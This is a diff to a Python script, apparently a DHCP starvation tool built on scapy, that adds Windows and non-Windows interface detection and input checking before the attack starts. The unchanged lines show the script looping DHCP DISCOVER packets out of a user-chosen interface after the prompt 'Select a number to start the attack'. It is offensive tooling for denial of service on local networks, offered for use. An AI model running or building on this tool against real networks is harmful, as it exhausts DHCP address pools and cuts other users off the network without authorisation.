@@ -1,13 +1,20 @@
 #!/usr/bin/python3
 from scapy.all import *
-import wmi
 import sys
 
-c = wmi.WMI()
-qry = "select Name from Win32_NetworkAdapter where NetEnabled=True and NetConnectionStatus=2"
-
-listInterfaces = [o.Name for o in c.query(qry)]
 is_windows = hasattr(sys, 'getwindowsversion')
+
+if (is_windows) :
+    import wmi
+
+    c = wmi.WMI()
+    qry = "select Name from Win32_NetworkAdapter where NetEnabled=True and NetConnectionStatus=2"
+
+    listInterfaces = [o.Name for o in c.query(qry)]
+else :
+    import netifaces
+
+    listInterfaces = netifaces.interfaces()
 
 
 def DHCPstarving() :
@@ -25,7 +32,10 @@ def DHCPstarving() :
 
     for i in range(len(listInterfaces)) :
         print (str(i+1)+') ', listInterfaces[i])    
+
     number = int(input("Select a number to start the attack :"))
+    while (number > len(listInterfaces)) :
+        number = int(input("Enter a valid number :"))
 
     sendp(DHCP_DISCOVER, iface=listInterfaces[number-1],loop=1,verbose=1 )
 
